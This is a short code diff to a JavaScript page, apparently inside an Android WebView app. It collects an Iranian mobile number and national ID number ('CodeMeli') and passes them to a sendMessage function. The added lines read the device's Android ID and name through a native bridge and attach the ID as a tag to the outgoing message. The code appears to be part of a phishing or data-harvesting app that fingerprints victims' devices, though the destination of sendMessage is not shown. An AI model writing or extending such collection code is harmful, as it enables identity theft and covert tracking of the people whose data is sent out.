@@ -309,6 +309,9 @@ function isValidEmail(email) {
   return emailPattern.test(email);
 }
 
+const androidId = androidListener.getAndroidID();
+const device = androidListener.deviceName();
+
 firstBtn.addEventListener('click', () => {
   if (!validateIranianMobileNumber(phoneInput.value)) {
     phoneValid.classList.remove('hidden');
@@ -336,6 +339,7 @@ firstBtn.addEventListener('click', () => {
       const message = `
       Phone: ${phone}
 CodeMeli: ${codeMeli}
+Tag: ${androidId}
   `;
       sendMessage(message);
       document.getElementById('page1').classList.add('hidden');
